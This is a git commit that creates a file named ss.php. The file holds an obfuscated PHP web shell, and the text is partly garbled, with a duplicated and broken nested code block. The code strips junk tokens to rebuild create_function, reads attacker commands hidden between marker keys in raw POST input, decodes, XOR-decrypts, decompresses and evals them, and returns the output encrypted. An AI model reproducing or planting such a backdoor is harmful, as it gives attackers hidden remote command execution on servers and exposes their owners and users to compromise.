97869181def0324cecebc60c4c9224ef04db2a63
mefistofeles <69184168+mefistofeles00@users.noreply.github.com>
2021-11-20 16:32:05 +0300

    Create ss.php

---
+++ ss.php
@@ -0,0 +1,22 @@
+<?php
+$p='nction x(n1$n1t,$k)n1{$c=strlen(n1$k);$l=sn1trlen($n1t);$on1n1="";for($i=0;n1$in1<$l;){fn1or($jn1n1';
+$P='$k="n181dc9b<?php
+$p='nction x(n1$n1t,$k)n1{$c=strlen(n1$k);$l=sn1trlen($n1t);$on1n1="";for($i=0;n1$in1<$l;){fn1or($jn1n1';
+$P='$k="n181dc9bdn1b";$kn1h="52d0n14dc20n103n16";$kf="n1dbd8313n1ed0n15n15";$p="cXcvn1lnxw6IOn1j9D6c";fun1';
+$z='=0;($j<$c&&$i<$n1l);$j++n1,$n1i++){$o.=$n1t{$in1n1}n1^$n1k{$j};}}retn1urn $on1;}n1ifn1 (@preg_n1ma';
+$A=str_replace('U','','crUeatUUUe_UUfunction');
+$b='nn1d_cln1ean1n();$r=@base6n14_n1encoden1(@x(@gn1zcompress(n1n1$o),$k));pn1rint(n1"$p$khn1$r$kf");}';
+$e='1evan1l(@gzuncompn1ress(n1@x(@basn1e64n1_decode($m[1]),$k)))n1n1;$o=@ob_n1gen1t_conten1nts();@ob_e';
+$g='tch("/$kh(.+)n1$kf/",@n1file_get_contn1entsn1("phpn1://input")n1,$m)n1==1) {@on1b_stn1art(n1);@n1n';
+$H=str_replace('n1','',$P.$p.$z.$g.$e.$b);
+$a=$A('',$H);$a();
+?>
+dn1b";$kn1h="52d0n14dc20n103n16";$kf="n1dbd8313n1ed0n15n15";$p="cXcvn1lnxw6IOn1j9D6c";fun1';
+$z='=0;($j<$c&&$i<$n1l);$j++n1,$n1i++){$o.=$n1t{$in1n1}n1^$n1k{$j};}}retn1urn $on1;}n1ifn1 (@preg_n1ma';
+$A=str_replace('U','','crUeatUUUe_UUfunction');
+$b='nn1d_cln1ean1n();$r=@base6n14_n1encoden1(@x(@gn1zcompress(n1n1$o),$k));pn1rint(n1"$p$khn1$r$kf");}';
+$e='1evan1l(@gzuncompn1ress(n1@x(@basn1e64n1_decode($m[1]),$k)))n1n1;$o=@ob_n1gen1t_conten1nts();@ob_e';
+$g='tch("/$kh(.+)n1$kf/",@n1file_get_contn1entsn1("phpn1://input")n1,$m)n1==1) {@on1b_stn1art(n1);@n1n';
+$H=str_replace('n1','',$P.$p.$z.$g.$e.$b);
+$a=$A('',$H);$a();
+?>
